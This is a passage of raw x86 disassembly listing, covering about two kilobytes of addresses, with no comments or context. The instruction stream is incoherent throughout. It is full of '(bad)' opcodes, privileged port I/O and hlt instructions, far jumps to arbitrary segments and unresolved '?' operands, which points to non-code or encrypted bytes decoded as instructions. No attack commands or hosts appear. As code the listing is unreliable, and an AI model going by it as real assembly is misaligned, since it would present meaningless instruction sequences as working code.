  4876f5:	call   0xa941730d
  4876fa:	cmp    DWORD PTR [ebx-0x50e7d450],ecx
  487700:	push   cs
  487701:	in     al,dx
  487702:	xor    BYTE PTR [eax+0x41],dh
  487705:	es xor al,0x7
  487708:	hlt    
  487709:	add    eax,0xa326f701
  48770e:	jnp    0x487778
  487710:	inc    DWORD PTR [edx-0x77]
  487713:	outs   dx,BYTE PTR ds:[esi]
  487714:	jo     0x487733
  487716:	sub    al,BYTE PTR [ebx]
  487718:	push   cs
  487719:	out    0x4a,eax
  48771b:	psrld  mm5,QWORD PTR [edx]
  48771e:	ror    BYTE PTR ds:0xbc184417,cl
  487724:	mov    bl,0xf1
  487726:	xchg   ebx,eax
  487727:	jae    0x487738
  487729:	mov    ah,0x8e
  48772b:	movsx  edx,WORD PTR [ebx+0x68]
  48772f:	sub    edi,DWORD PTR [ebp+0x2b58194f]
  487735:	push   esp
  487736:	cld    
  487737:	(bad)  [edx]
  487739:	push   0x376a338a
  48773e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48773f:	sbb    DWORD PTR [eax+0x4884307b],esp
  487745:	adc    DWORD PTR ds:0x386c6358,0x3b01114c
  48774f:	push   cs
  487750:	jmp    0x2be6:0xbb638eed
  487757:	sbb    ah,al
  487759:	and    eax,0xc7c09b30
  48775e:	inc    ecx
  48775f:	(bad)  
  487760:	clc    
  487761:	iret   
  487762:	add    ah,BYTE PTR [edx+0x12]
  487765:	retf   0x89c0
  487768:	jae    0x4877e2
  48776a:	mov    DWORD PTR [ebx+0x70],edi
  48776d:	add    al,0xae
  48776f:	aam    0x4b
  487771:	inc    ecx
  487772:	je     0x48770a
  487774:	push   edi
  487775:	mov    cl,0x48
  487777:	cwde   
  487778:	mov    ebp,0x20b1cb73
  48777d:	push   0x43
  48777f:	push   0xffffff94
  487781:	nop
  487782:	and    edx,DWORD PTR [ebp+0x61147fa1]
  487788:	lea    ebp,[eax]
  48778a:	cs push 0x470a8998
  487790:	xchg   DWORD PTR [ecx],esi
  487792:	lock sbb al,0x91
  487795:	fadd   st(3),st
  487797:	scas   eax,DWORD PTR es:[edi]
  487798:	mov    DWORD PTR [bx+si+0x1142],0x21803bc7
  4877a1:	mov    ecx,0x507eb0a5
  4877a6:	loopne 0x487756
  4877a8:	or     eax,0x9ccdbf7b
  4877ad:	aam    0x56
  4877af:	js     0x4877e6
  4877b1:	jle    0x48776f
  4877b3:	or     eax,0xdd81b176
  4877b8:	or     bl,ch
  4877ba:	pop    ds
  4877bb:	jg     0x487839
  4877bd:	fwait
  4877be:	sbb    dl,al
  4877c0:	inc    edi
  4877c1:	test   al,0x7
  4877c3:	or     eax,0xade97bd0
  4877c8:	loop   0x4877f3
  4877ca:	pop    ss
  4877cb:	ret    
  4877cc:	lods   al,BYTE PTR ds:[esi]
  4877cd:	ret    0xbff8
  4877d0:	aas    
  4877d1:	enter  0x39c7,0x3b
  4877d5:	ja     0x487843
  4877d7:	je     0x48780d
  4877d9:	pop    ds
  4877da:	jg     0x4877bc
  4877dc:	mov    ebx,esi
  4877de:	mov    DWORD PTR [edi+0x6c],ebx
  4877e1:	pop    ebx
  4877e2:	and    al,0x10
  4877e4:	ja     0x487842
  4877e6:	test   al,0xbf
  4877e8:	retf   0x5a30
  4877eb:	or     BYTE PTR [ebx-0x50],al
  4877ee:	imul   esi,DWORD PTR [esi],0x3a0312f0
  4877f4:	mov    bl,0x13
  4877f6:	mov    edi,0x34a0d860
  4877fb:	das    
  4877fc:	test   eax,0xe1306614
  487801:	popa   
  487802:	adc    edi,DWORD PTR [esi]
  487804:	popa   
  487805:	mov    ds:0xbf5092d0,al
  48780a:	ins    BYTE PTR es:[edi],dx
  48780b:	sbb    eax,0xbfe258f5
  487810:	pop    ecx
  487811:	and    al,0x54
  487813:	or     bh,bl
  487815:	inc    edx
  487816:	dec    ecx
  487817:	fst    DWORD PTR [esi-0x27]
  48781a:	scas   eax,DWORD PTR es:[edi]
  48781b:	jae    0x48785d
  48781d:	inc    ecx
  48781e:	fsub   DWORD PTR [esi+0x58]
  487821:	test   eax,0x60c15d82
  487826:	cmp    edi,esi
  487828:	iret   
  487829:	aam    0xff
  48782b:	dec    ebx
  48782c:	push   eax
  48782d:	cmp    BYTE PTR [eax],dh
  48782f:	fs push 0x2f
  487832:	add    BYTE PTR [edx+0x34ce1106],ch
  487838:	lahf   
  487839:	das    
  48783a:	dec    edx
  48783b:	pop    ebp
  48783c:	add    eax,0xe060d23b
  487841:	cdq    
  487842:	sub    dh,al
  487844:	inc    esi
  487845:	cs call 0x38f0372b
  48784b:	xor    DWORD PTR [ebp*4+0x3e16cd82],eax
  487852:	or     BYTE PTR [edi-0x6f3bd841],cl
  487858:	push   edx
  487859:	sub    BYTE PTR [edi+0x5f],dh
  48785c:	add    DWORD PTR [edx+0x55020817],edx
  487862:	ins    DWORD PTR es:[edi],dx
  487863:	loope  0x4877ee
  487865:	adc    ebx,DWORD PTR [ecx+0x3]
  487868:	and    ah,BYTE PTR [eax+0x18b4817a]
  48786e:	pop    edi
  48786f:	push   ebp
  487870:	add    BYTE PTR [ecx],al
  487872:	jge    0x487881
  487874:	test   DWORD PTR [eax],ebx
  487876:	xor    DWORD PTR [esi],eax
  487878:	(bad)  
  487879:	(bad)  
  48787a:	pop    esi
  48787b:	les    edi,FWORD PTR [ebx]
  48787d:	stos   BYTE PTR es:[edi],al
  48787e:	and    DWORD PTR [edi],edi
  487880:	and    BYTE PTR [ebx-0x106e9c9f],0x83
  487887:	push   cs
  487888:	xchg   edx,eax
  487889:	inc    ebx
  48788a:	aaa    
  48788b:	rol    BYTE PTR [ecx-0x74],1
  48788e:	jbe    0x4878c8
  487890:	sub    ebx,0x325e3b91
  487896:	daa    
  487897:	sub    al,0x77
  487899:	popf   
  48789a:	enter  0x91f2,0xd6
  48789e:	push   ds
  48789f:	and    DWORD PTR [edi+0x8],eax
  4878a2:	add    dl,BYTE PTR ds:0x1c214992
  4878a8:	inc    edx
  4878a9:	daa    
  4878aa:	popf   
  4878ab:	scas   al,BYTE PTR es:[edi]
  4878ac:	xor    dh,BYTE PTR [ecx-0x3338b528]
  4878b2:	pop    ebx
  4878b3:	or     al,0xf9
  4878b5:	dec    ebx
  4878b6:	adc    al,BYTE PTR [esi]
  4878b8:	hlt    
  4878b9:	cmp    al,BYTE PTR [ebx]
  4878bb:	cmp    BYTE PTR [eax+0x62c0d253],0x7e
  4878c2:	sub    BYTE PTR [bp+si],0x9
  4878c6:	mov    edi,0xf107ad3
  4878cb:	push   eax
  4878cc:	sbb    al,0x3b
  4878ce:	inc    edx
  4878cf:	fs jne 0x487922
  4878d2:	mov    gs,WORD PTR [esi]
  4878d4:	adc    edx,DWORD PTR [ebx+0x6d1c2710]
  4878da:	imul   edx,DWORD PTR [ecx],0x40
  4878dd:	push   eax
  4878de:	test   BYTE PTR [eax+0x23],al
  4878e1:	in     al,dx
  4878e2:	and    dl,BYTE PTR [eax+0x78]
  4878e5:	inc    edx
  4878e6:	pusha  
  4878e7:	aaa    
  4878e8:	jne    0x487909
  4878ea:	mov    cl,BYTE PTR [edx+eax*8]
  4878ed:	mov    ?,WORD PTR [ebx]
  4878ef:	neg    dl
  4878f1:	and    bl,BYTE PTR es:[edx-0xb27a189]
  4878f8:	push   cs
  4878f9:	sbb    BYTE PTR [esi+eax*2+0x1520829f],ch
  487900:	push   esi
  487901:	repnz add al,BYTE PTR [eax*1-0x1f9c4f76]
  487909:	std    
  48790a:	pop    edx
  48790b:	push   edi
  48790c:	jmp    0x48792f
  48790e:	mov    bl,0x1
  487910:	pop    edi
  487911:	out    0x42,eax
  487913:	(bad)  
  487914:	ret    0x2d06
  487917:	push   ebp
  487918:	mov    WORD PTR [esi+0xc],?
  48791b:	shr    dh,1
  48791d:	pushf  
  48791e:	rol    BYTE PTR [edx+0x644d5d1d],cl
  487924:	test   al,dl
  487926:	pop    ss
  487927:	or     al,0xac
  487929:	jle    0x4878b5
  48792b:	dec    edx
  48792c:	adc    BYTE PTR [eax+0x19be2ef9],al
  487932:	sahf   
  487933:	xor    DWORD PTR [ebx],edi
  487935:	add    DWORD PTR fs:[esi],0x1e
  487939:	add    dh,BYTE PTR [ebp+0xc]
  48793c:	mov    edx,0xf1240d02
  487941:	inc    ecx
  487942:	jmp    0x487957
  487944:	xor    ecx,ecx
  487946:	dec    edx
  487947:	cmp    al,0x4e
  487949:	mov    ah,0xc1
  48794b:	xchg   edx,eax
  48794c:	jae    0x487944
  48794e:	pop    DWORD PTR [eax+eax*1+0x42720584]
  487955:	test   BYTE PTR [eax],al
  487957:	mov    ds:0xef917517,eax
  48795c:	cli    
  48795d:	gs pop ds
  48795f:	pop    esp
  487960:	adc    dl,bh
  487962:	push   es
  487963:	push   cs
  487964:	imul   edx,DWORD PTR [edx+edi*1],0x45
  487968:	adc    BYTE PTR [esi+0x18],bh
  48796b:	fld    st(0)
  48796d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48796e:	leave  
  48796f:	hlt    
  487970:	sbb    BYTE PTR [edi-0x19657830],al
  487976:	cli    
  487977:	and    BYTE PTR [ebx+ecx*4-0x23],cl
  48797b:	fsubr  st,st(2)
  48797d:	pop    eax
  48797e:	fst    DWORD PTR [eax-0x472b4a26]
  487984:	push   ss
  487985:	dec    esi
  487986:	outs   dx,DWORD PTR ds:[esi]
  487987:	sbb    eax,0xd6a6242b
  48798c:	ja     0x487955
  48798e:	push   esi
  48798f:	or     eax,0xceac1c06
  487994:	push   0x75
  487996:	adc    bl,BYTE PTR [edi+0x7b]
  487999:	push   cs
  48799a:	out    dx,eax
  48799b:	xchg   esi,eax
  48799c:	lods   eax,DWORD PTR ds:[esi]
  48799d:	fwait
  48799e:	xor    ah,bh
  4879a0:	in     al,dx
  4879a1:	popa   
  4879a2:	xor    eax,0x1f5fc584
  4879a7:	pusha  
  4879a8:	loope  0x487961
  4879aa:	sbb    eax,edx
  4879ac:	shl    DWORD PTR [ebx+ebx*1+0xe],0x8b
  4879b1:	jo     0x487a17
  4879b3:	inc    ebx
  4879b4:	sub    ecx,DWORD PTR [ecx]
  4879b6:	fwait
  4879b7:	(bad)  
  4879b8:	jne    0x487a00
  4879ba:	and    DWORD PTR [eax-0x5f],eax
  4879bd:	(bad)  
  4879be:	(bad)  
  4879bf:	add    al,0x3e
  4879c1:	xchg   esp,eax
  4879c2:	dec    eax
  4879c3:	jne    0x4879fb
  4879c5:	adc    al,0xf3
  4879c7:	push   ds
  4879c8:	adc    bl,al
  4879ca:	(bad)  
  4879cb:	sbb    edi,ebp
  4879cd:	cmp    cl,BYTE PTR [ebx-0x19132694]
  4879d3:	push   es
  4879d4:	nop
  4879d5:	push   es
  4879d6:	add    al,0xeb
  4879d8:	push   ecx
  4879d9:	adc    ch,al
  4879db:	sub    ebp,DWORD PTR [ebx+esi*2]
  4879de:	shl    BYTE PTR [ecx-0x5e],1
  4879e1:	dec    eax
  4879e2:	jl     0x487a05
  4879e4:	mov    eax,0xb6782c56
  4879e9:	dec    esp
  4879ea:	inc    edx
  4879eb:	pop    ebp
  4879ec:	stos   BYTE PTR es:[edi],al
  4879ed:	mov    ebp,eax
  4879ef:	retf   
  4879f0:	pop    esp
  4879f1:	repz push ebx
  4879f3:	dec    edi
  4879f4:	in     al,dx
  4879f5:	sub    ebp,eax
  4879f7:	jmp    0x487a1f
  4879f9:	adc    al,0xfb
  4879fb:	jmp    0xcf98:0x6bbdba2
  487a02:	stos   DWORD PTR es:[edi],eax
  487a03:	push   eax
  487a04:	cmp    cl,BYTE PTR fs:[edx+0x56]
  487a08:	add    eax,0x33f4688b
  487a0d:	test   BYTE PTR [ecx+0x15],ah
  487a10:	mov    dl,al
  487a12:	popa   
  487a13:	lds    ebp,FWORD PTR [edi+0x1a01b060]
  487a19:	push   edi
  487a1a:	xor    DWORD PTR [ecx],eax
  487a1c:	cmp    al,0xa8
  487a1e:	and    eax,0xb3de2810
  487a23:	test   DWORD PTR [ebx+0x13319da4],eax
  487a29:	rol    eax,1
  487a2b:	cmp    eax,0x10468a7f
  487a30:	jnp    0x487a44
  487a32:	sub    eax,0xebc5df6e
  487a37:	and    BYTE PTR [ecx+0x35],al
  487a3a:	test   BYTE PTR [eax+edi*8],cl
  487a3d:	jmp    0x487a51
  487a3f:	inc    eax
  487a40:	test   BYTE PTR [ebp+0x0],ch
  487a43:	lods   al,BYTE PTR ds:[esi]
  487a44:	pop    ds
  487a45:	sbb    al,0xa1
  487a47:	xchg   BYTE PTR [eax+0x5a482771],dl
  487a4d:	mov    ecx,edx
  487a4f:	sub    al,0xc1
  487a51:	dec    edx
  487a52:	pop    ss
  487a53:	add    BYTE PTR [edx+0x37],bl
  487a56:	and    eax,0x655dd334
  487a5b:	sbb    eax,0xec197087
  487a60:	hlt    
  487a61:	fistp  DWORD PTR [esi]
  487a63:	add    ch,BYTE PTR [edx]
  487a65:	daa    
  487a66:	or     eax,0x18565886
  487a6b:	mov    es,WORD PTR [esi+0x55]
  487a6e:	push   edx
  487a6f:	leave  
  487a70:	mov    edi,0x4d8d410d
  487a75:	jns    0x487a11
  487a77:	add    eax,0x859f132f
  487a7c:	sub    cl,BYTE PTR ds:0x806cac80
  487a82:	cmp    BYTE PTR [ecx+esi*2+0x3c],0x73
  487a87:	add    ecx,DWORD PTR [eax-0x8]
  487a8a:	rol    dh,1
  487a8c:	xchg   BYTE PTR [edx-0x23],dl
  487a8f:	leave  
  487a90:	add    ah,BYTE PTR [edi-0x6b73a080]
  487a96:	adc    eax,DWORD PTR [edi]
  487a98:	inc    ebx
  487a99:	scas   eax,DWORD PTR es:[edi]
  487a9a:	test   BYTE PTR ds:[ebx+ebp*8-0x79],bh
  487a9f:	mov    ?,WORD PTR [edi]
  487aa1:	hlt    
  487aa2:	cld    
  487aa3:	mov    si,0xdbb9
  487aa7:	or     eax,0x7b482d03
  487aac:	xchg   ebp,eax
  487aad:	repnz cwde 
  487aaf:	cli    
  487ab0:	dec    ebp
  487ab1:	pop    ss
  487ab2:	inc    ebx
  487ab3:	cmp    BYTE PTR [ecx+0x19ba3858],cl
  487ab9:	xchg   esi,eax
  487aba:	mov    al,0x44
  487abc:	mov    ds:0x1a622a1b,eax
  487ac1:	push   eax
  487ac2:	push   cs
  487ac3:	mov    ds:0x600995fe,eax
  487ac8:	dec    ecx
  487ac9:	and    BYTE PTR [esi-0x6ea3f74f],dl
  487acf:	outs   dx,BYTE PTR ds:[esi]
  487ad0:	cmp    bl,ah
  487ad2:	es inc edx
  487ad4:	ror    DWORD PTR [eax-0x59],0xdb
  487ad8:	retf   
  487ad9:	mov    eax,0x142b1693
  487ade:	inc    ebp
  487adf:	pusha  
  487ae0:	cmc    
  487ae1:	ror    DWORD PTR [ecx+0x5b7aaccb],0xc4
  487ae8:	shl    DWORD PTR [esp+ebx*4+0x7],cl
  487aec:	fcom   DWORD PTR [edx+ebp*8]
  487aef:	mov    WORD PTR [ecx+0x6f],cs
  487af2:	jmp    0x5b38:0x3ec07e1
  487af9:	mov    esp,0x1554bac
  487afe:	in     eax,dx
  487aff:	popf   
  487b00:	jno    0x487a9c
  487b02:	inc    esp
  487b03:	adc    cl,BYTE PTR [ebx-0x63]
  487b06:	sbb    al,0x83
  487b08:	jp     0x487b76
  487b0a:	push   ds
  487b0b:	test   ecx,edx
  487b0d:	jp     0x487b62
  487b0f:	nop
  487b10:	cmp    ebx,DWORD PTR [edx+edx*2+0x16908810]
  487b17:	push   ebx
  487b18:	fadd   st(5),st
  487b1a:	mov    esi,0xd83f763d
  487b1f:	jp     0x487b5e
  487b21:	sbb    ecx,DWORD PTR [ebp+0x55f01dd7]
  487b27:	mov    WORD PTR [esi-0x202fdfd8],es
  487b2d:	jmp    0x1708:0xf814bff5
  487b34:	sbb    al,0x2b
  487b36:	pop    eax
  487b37:	pmaxub mm3,mm1
  487b3a:	ror    DWORD PTR [ebp+edx*1+0x51690c70],1
  487b41:	jne    0x487b8f
  487b43:	mov    cl,0xca
  487b45:	mov    dl,0x6e
  487b47:	push   edi
  487b48:	xrelease mov BYTE PTR [esi],dl
  487b4b:	and    DWORD PTR [ebp+ecx*4+0x5a],esp
  487b4f:	test   BYTE PTR [edx+0x4271040],0x64
  487b56:	dec    ebx
  487b57:	adc    esp,DWORD PTR [edi+0x79]
  487b5a:	cmp    BYTE PTR [ebx+edi*2-0x16],0x53
  487b5f:	push   0x3c74337c
  487b64:	xor    bl,BYTE PTR [esi-0x35]
  487b67:	push   cs
  487b68:	clc    
  487b69:	loope  0x487b6f
  487b6b:	fs pop ds
  487b6d:	leave  
  487b6e:	add    BYTE PTR [ecx+0x70333688],al
  487b74:	ror    DWORD PTR [ecx-0x40],0x83
  487b78:	dec    ecx
  487b79:	push   esi
  487b7a:	cs mov cl,0xf8
  487b7d:	xchg   edx,eax
  487b7e:	out    0x5a,al
  487b80:	in     al,0x1a
  487b82:	add    cl,BYTE PTR [ebx+0x9855acb]
  487b88:	sbb    al,0x18
  487b8a:	mov    ebx,0x26c4594f
  487b8f:	shl    dl,0xc5
  487b92:	xor    al,dh
  487b94:	lock nop
  487b96:	cld    
  487b97:	mov    ds:0x106ec0af,al
  487b9c:	sub    ebp,ecx
  487b9e:	pop    ss
  487b9f:	cmp    DWORD PTR [ecx],ebx
  487ba1:	enter  0xff2e,0x14
  487ba5:	adc    eax,0x9f1e2b49
  487baa:	push   ss
  487bab:	addr16 jbe 0x487bf1
  487bae:	and    BYTE PTR [esi+0x3c320cc],ah
  487bb4:	es xchg ecx,eax
  487bb6:	add    edx,esi
  487bb8:	call   0x63769077
  487bbd:	inc    ebx
  487bbe:	adc    eax,0x8cd7f775
  487bc3:	(bad)  
  487bc5:	inc    edi
  487bc6:	ror    DWORD PTR [ebx+0x24fc085b],1
  487bcc:	jae    0x487b4e
  487bce:	cmpps  xmm6,XMMWORD PTR [ebx],0x20
  487bd2:	or     eax,0x52d72231
  487bd7:	hlt    
  487bd8:	rcl    BYTE PTR [ecx+edi*8],0xc
  487bdc:	cmp    al,0xd6
  487bde:	fdivr  QWORD PTR [ebx]
  487be0:	fs pop ebp
  487be2:	sbb    esi,DWORD PTR [edx]
  487be4:	pop    esi
  487be5:	imul   ecx,DWORD PTR [edi+0x53],0x99f3ef28
  487bec:	mov    dh,0x61
  487bee:	sbb    bh,BYTE PTR [esp+edx*1+0x27]
  487bf2:	mov    BYTE PTR [ebx-0x6ba05ccc],0x69
  487bf9:	jle    0x487c14
  487bfb:	std    
  487bfc:	call   0x689f987f
  487c01:	test   BYTE PTR [ebx+0x3f4cd906],dh
  487c07:	add    dh,BYTE PTR [ecx+0x4c95888b]
  487c0d:	mov    edi,0x9693bc23
  487c12:	mov    cl,0xbe
  487c14:	xchg   esi,eax
  487c15:	sbb    al,0x37
  487c17:	mov    ah,0x94
  487c19:	sbb    al,0xe1
  487c1b:	pop    eax
  487c1c:	sbb    BYTE PTR [eax],bh
  487c1e:	sbb    BYTE PTR [esi+0x8],cl
  487c21:	sbb    BYTE PTR [eax+0x20],0x86
  487c25:	outs   dx,DWORD PTR ds:[esi]
  487c26:	retf   
  487c27:	xchg   BYTE PTR [esi],ah
  487c29:	mov    al,0x1b
  487c2b:	or     al,0x4
  487c2d:	shl    bh,1
  487c2f:	popa   
  487c30:	add    ecx,ebx
  487c32:	and    eax,0xe5c01870
  487c37:	aaa    
  487c38:	repnz cmp DWORD PTR [eax],ebx
  487c3b:	or     al,0xf4
  487c3d:	(bad)  
  487c3e:	les    esp,FWORD PTR [esi]
  487c40:	stos   BYTE PTR es:[edi],al
  487c41:	ret    0xbc3c
  487c44:	cmp    al,0x2
  487c46:	or     DWORD PTR [ecx],esp
  487c48:	cmc    
  487c49:	mov    al,ds:0x751c8180
  487c4e:	sbb    DWORD PTR cs:[edi],edi
  487c51:	daa    
  487c52:	add    al,0x1c
  487c54:	neg    DWORD PTR [ebp+edx*2+0x4]
  487c58:	sbb    al,0x3
  487c5a:	mov    esp,0xfc6037bc
  487c5f:	or     DWORD PTR [ebx+0x5b],esp
  487c62:	pop    eax
  487c63:	adc    al,bh
  487c65:	bound  ebx,QWORD PTR [ecx-0x1e3c3ed8]
  487c6b:	mov    dh,BYTE PTR [eax+0x5790e12a]
  487c71:	fdiv   st,st(0)
  487c73:	cdq    
  487c74:	hlt    
  487c75:	sbb    eax,0x9006ab00
  487c7a:	dec    DWORD PTR [ecx-0x50981e9b]
  487c80:	mov    cl,0x3
  487c82:	adc    ebx,DWORD PTR [esi]
  487c84:	jle    0x487ce2
  487c86:	or     DWORD PTR [eax],ebx
  487c88:	in     al,0x1d
  487c8a:	fs popf 
  487c8c:	and    eax,0xada8eedc
  487c91:	not    DWORD PTR [esi-0xa364b49]
  487c97:	xor    dl,dl
  487c99:	jecxz  0x487c1e
  487c9b:	sub    BYTE PTR [ecx-0x3a],ah
  487c9e:	aam    0xb4
  487ca0:	jmp    ebp
  487ca2:	mov    ecx,DWORD PTR [edx+0x38]
  487ca5:	mov    DWORD PTR [eax+0x30],ecx
  487ca8:	or     bh,BYTE PTR [esp+esi*1]
  487cab:	inc    ecx
  487cac:	mov    eax,0x290c40b
  487cb1:	call   0x810128ee
  487cb6:	dec    eax
  487cb7:	mov    esp,DWORD PTR [edx-0x7f]
  487cba:	jmp    0x487ca4
  487cbc:	ins    BYTE PTR es:[edi],dx
  487cbd:	or     al,0x6e
  487cbf:	daa    
  487cc0:	xchg   ebx,eax
  487cc1:	pop    ss
  487cc2:	sbb    dl,dl
  487cc4:	dec    ebx
  487cc5:	add    BYTE PTR [esi+edx*2+0x9bdb330],ah
  487ccc:	repz cwde 
  487cce:	push   esi
  487ccf:	xor    al,0xba
  487cd1:	sbb    al,BYTE PTR [esi+0x34]
  487cd4:	add    al,dh
  487cd6:	add    DWORD PTR [eax],eax
  487cd8:	int    0x9a
  487cda:	fsub   DWORD PTR [ecx]
  487cdc:	pushf  
  487cdd:	push   edx
  487cde:	(bad)  
  487cdf:	rcr    edx,cl
  487ce1:	mov    al,0xdd
  487ce3:	(bad)  
  487ce4:	mov    edi,0x1830439
  487ce9:	or     al,0xc3
  487ceb:	add    DWORD PTR [ecx+0x4],0x8
  487cef:	inc    DWORD PTR [eax+0x6c]
  487cf2:	push   es
  487cf3:	dec    eax
  487cf4:	ins    BYTE PTR es:[edi],dx
  487cf5:	popa   
  487cf6:	sbb    BYTE PTR [edi+0x16],0xde
  487cfa:	jg     0x487d06
  487cfc:	pop    ebx
  487cfd:	inc    eax
  487cfe:	or     cl,BYTE PTR fs:[edi+0x6758a33c]
  487d05:	test   DWORD PTR [ebp+0x32],esp
  487d08:	cmp    BYTE PTR [eax-0x63],0x3d
  487d0c:	xchg   edx,eax
  487d0d:	inc    eax
  487d0e:	sbb    eax,0xfffffff8
  487d11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  487d12:	xor    dl,BYTE PTR [eax]
  487d14:	sahf   
  487d15:	mov    al,0x5a
  487d17:	clc    
  487d18:	add    BYTE PTR [edx-0x44a3fef4],ch
  487d1e:	(bad)  
  487d1f:	mov    BYTE PTR [esi-0x6f],al
  487d22:	mov    cl,al
  487d24:	pop    ecx
  487d25:	aaa    
  487d26:	or     al,cl
  487d28:	push   ss
  487d29:	and    al,BYTE PTR [edi+0x6c939008]
  487d2f:	lods   al,BYTE PTR ds:[esi]
  487d30:	addr16 mov ebp,0x6032b5ad
  487d36:	fisub  DWORD PTR [ecx+0x10]
  487d39:	fs or  cl,BYTE PTR fs:[edx]
  487d3d:	mov    al,0x50
  487d3f:	pop    edi
  487d40:	xchg   BYTE PTR [ebp-0x27],dl
  487d43:	mov    edi,eax
  487d45:	das    
  487d46:	cmp    al,0x6d
  487d49:	sub    eax,0x870ec48
  487d4e:	into   
  487d4f:	mov    ah,0x6e
  487d51:	dec    ebx
  487d52:	pop    ss
  487d53:	call   DWORD PTR [esi]
  487d55:	aam    0xe6
  487d57:	fsubr  DWORD PTR [ebp-0x4c]
  487d5a:	adc    al,0xa0
  487d5c:	lods   eax,DWORD PTR ds:[esi]
  487d5d:	dec    esp
  487d5e:	pop    ecx
  487d5f:	mov    esi,0xa2c42a21
  487d64:	nop
  487d65:	inc    edi
  487d66:	xchg   BYTE PTR [esi-0x15],bl
  487d69:	ret    0x9c08
  487d6c:	fs adc al,dl
  487d6f:	xor    eax,ebp
  487d71:	push   cs
  487d72:	sub    esp,ebp
  487d74:	daa    
  487d75:	inc    edi
  487d76:	and    eax,0x501320
  487d7b:	push   ds
  487d7c:	scas   eax,DWORD PTR es:[edi]
  487d7d:	adc    BYTE PTR [ecx],al
  487d7f:	jae    0x487d3e
  487d81:	add    ch,BYTE PTR [edi]
  487d83:	jmp    0x487dcc
  487d85:	jg     0x487d4a
  487d87:	(bad)  [edx+0x1d]
  487d8a:	leave  
  487d8b:	das    
  487d8c:	inc    ebp
  487d8d:	xchg   DWORD PTR [ebx],esp
  487d8f:	cmp    eax,0x6badb1cb
  487d94:	mov    ebx,0xd1304419
  487d99:	popa   
  487d9a:	loopne 0x487d53
  487d9c:	loop   0x487d92
  487d9e:	imul   edx,DWORD PTR [eax-0x195a56fa],0xe1493b2
  487da8:	ror    BYTE PTR [ebx-0x46],cl
  487dab:	xor    al,0x17
  487dad:	js     0x487d3f
  487daf:	push   cs
  487db0:	(bad)  
  487db2:	fadd   DWORD PTR [eax+0x23ed827e]
  487db8:	cld    
  487db9:	sub    DWORD PTR [eax],esi
  487dbb:	cwde   
  487dbc:	cmp    BYTE PTR ds:0xfd047089,cl
  487dc2:	sbb    ch,BYTE PTR [eax+0x3b]
  487dc5:	sub    BYTE PTR [eax],bh
  487dc7:	mov    fs,WORD PTR [ebx]
  487dc9:	es xor BYTE PTR fs:[edi-0x5c54d834],dl
  487dd1:	mov    esp,0x6c2efe1e
  487dd6:	pop    edi
  487dd7:	pop    ebp
  487dd8:	adc    eax,0x2be87d59
  487ddd:	jge    0x487dbf
  487ddf:	loopne 0x487e3b
  487de1:	js     0x487d85
  487de3:	push   ebx
  487de4:	adc    al,BYTE PTR [ebx+0x4a]
  487de7:	dec    ecx
  487de8:	pusha  
  487de9:	xor    eax,0xad25c4a
  487dee:	pop    esp
  487def:	push   ecx
  487df0:	js     0x487df2
  487df2:	in     al,0xe7
  487df4:	les    ebp,FWORD PTR [edi+0xacf0c01]
  487dfa:	sbb    eax,0x2de0f0fb
  487dff:	loopne 0x487d89
  487e01:	aaa    
  487e02:	jne    0x487dca
  487e04:	adc    dl,BYTE PTR [esi]
  487e06:	adc    al,0xae
  487e08:	sub    BYTE PTR [eax],0x34
  487e0b:	lahf   
  487e0c:	mov    dl,0x56
  487e0e:	ins    BYTE PTR es:[edi],dx
  487e0f:	ror    BYTE PTR [edx],1
  487e11:	and    eax,DWORD PTR [edx]
  487e13:	sbb    esi,ebp
  487e15:	mov    dl,0x8f
  487e17:	rol    eax,cl
  487e19:	xchg   ebx,eax
  487e1a:	and    al,0x24
  487e1c:	pop    ss
  487e1d:	and    DWORD PTR [ebx+0x1d344ccb],ecx
  487e23:	push   esp
  487e24:	xor    DWORD PTR [ebx+0x2e],edx
  487e27:	inc    edx
  487e28:	inc    esp
  487e29:	cmp    BYTE PTR [eax],bl
  487e2b:	mov    esp,0xca5f6880
  487e30:	add    al,dh
  487e32:	xlat   BYTE PTR ds:[ebx]
  487e33:	adc    al,0xf6
  487e35:	sub    al,0x5
  487e37:	jne    0x487e44
  487e39:	xchg   BYTE PTR ds:0xd8a384d4,bl
  487e3f:	(bad)  
  487e40:	mov    dh,0xf8
  487e42:	cmp    eax,0x709b1955
  487e47:	pop    esp
  487e48:	sub    eax,0xf3f51840
  487e4d:	jmp    0x487eb5
  487e4f:	mov    al,BYTE PTR [eax+0x1df3054]
  487e55:	add    eax,DWORD PTR [ebp+0x483fde3c]
  487e5b:	jne    0x487ec7
  487e5d:	mov    edi,DWORD PTR [ebx+0x38]
  487e60:	add    eax,0x3264b424
  487e65:	imul   DWORD PTR [esi]
  487e67:	or     cl,BYTE PTR [ecx]
  487e69:	and    eax,0x2ded5cf4
  487e6e:	jmp    0x487ec4
  487e70:	xor    al,al
  487e72:	push   ds
  487e73:	lock (bad) 
  487e75:	adc    eax,0x6cb9c7a2
  487e7a:	je     0x487efb
  487e7c:	pushf  
  487e7d:	sbb    BYTE PTR [esi+0x67],cl
  487e80:	mov    DWORD PTR [ebx+0x68],eax
  487e83:	jmp    0x487eae
  487e85:	push   ebp
  487e86:	add    DWORD PTR [edx],esp
  487e88:	pop    eax
  487e89:	xor    al,BYTE PTR [edx+eax*1-0x7ef99a59]
  487e90:	inc    ecx
  487e91:	xchg   esp,eax
  487e92:	popf   
  487e93:	mov    eax,0x44104fc1
  487e98:	sub    ebx,0x6
  487e9b:	into   
  487e9c:	push   cs
  487e9d:	add    DWORD PTR [edi+ecx*1],ebx
  487ea0:	adc    BYTE PTR [esi],bh
  487ea2:	stos   BYTE PTR es:[edi],al
  487ea3:	fadd   DWORD PTR [edx-0x8927eff]
  487ea9:	cmp    al,BYTE PTR [esi*2+0x2070f41a]
  487eb0:	adc    dh,dl
  487eb2:	les    edx,FWORD PTR [edx+0x38e88c5c]
  487eb8:	shl    DWORD PTR [esi-0x237044a1],0xeb
  487ebf:	sbb    al,0x2e
  487ec1:	not    DWORD PTR [edx+0x3b]
  487ec4:	mov    ?,WORD PTR [eax+eiz*2]
  487ec7:	xchg   DWORD PTR [esi-0x5279944e],edx
  487ecd:	iret   
  487ece:	ret    0x24a8
  487ed1:	inc    edi
  487ed2:	cmp    DWORD PTR [ecx-0x3179f16e],esp
  487ed8:	mov    ebp,0x14ececd8
  487edd:	fadd   QWORD PTR [eax+eax*1]
  487ee0:	xchg   esp,eax
